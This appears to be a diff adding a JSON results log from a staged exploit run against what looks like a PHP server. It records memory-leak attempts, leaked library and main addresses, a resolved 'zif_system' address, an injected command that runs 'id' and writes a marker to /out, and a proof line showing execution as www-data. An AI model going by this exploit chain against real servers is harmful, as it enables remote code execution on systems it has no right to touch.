@@ -1,0 +1,106 @@
+{
+ "stages": [
+  {
+   "stage": "A1",
+   "rc": 0,
+   "elapsed": 0.11
+  },
+  {
+   "stage": "B1",
+   "i": 0,
+   "bytes": 259,
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "B1",
+   "i": 1,
+   "bytes": 259,
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "B1",
+   "i": 2,
+   "bytes": 259,
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "B1",
+   "i": 3,
+   "bytes": 1641415,
+   "decoded": 819208,
+   "lib": "0x7f76436ba000",
+   "cands": [
+    [
+     "0x7f7641a00000",
+     87
+    ],
+    [
+     "0x7f7641200000",
+     79
+    ]
+   ],
+   "main": "0x7f7641a00000",
+   "leak": "hit",
+   "chosen": true
+  },
+  {
+   "stage": "B1",
+   "i": 4,
+   "bytes": 259,
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "A2",
+   "i": 0,
+   "bytes": 211
+  },
+  {
+   "stage": "A2",
+   "i": 1,
+   "bytes": 211
+  },
+  {
+   "stage": "A2",
+   "i": 2,
+   "bytes": 211
+  },
+  {
+   "stage": "A2",
+   "i": 3,
+   "bytes": 211
+  },
+  {
+   "stage": "A2",
+   "i": 4,
+   "bytes": 211
+  },
+  {
+   "stage": "B2",
+   "i": 0,
+   "bytes": 0
+  }
+ ],
+ "success": true,
+ "marker": "CONC1",
+ "a1": {
+  "bytes": 1060211,
+  "sha256": "8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6"
+ },
+ "b1": {
+  "bytes": 33128677,
+  "sha256": "b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2"
+ },
+ "S": "0x7f7641af8398",
+ "zif_system": "0x7f7643b1f370",
+ "main": "0x7f7641a00000",
+ "lib": "0x7f76436ba000",
+ "a2": {
+  "bytes": 279369
+ },
+ "b2": {
+  "bytes": 451384,
+  "cmd": "id>/out/p1_conc_CONC1;echo CONC1>>/out/p1_conc_CONC1;id>&2;echo CONC1>&2"
+ },
+ "proof": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nCONC1\n",
+ "b2_hit": 0
+}
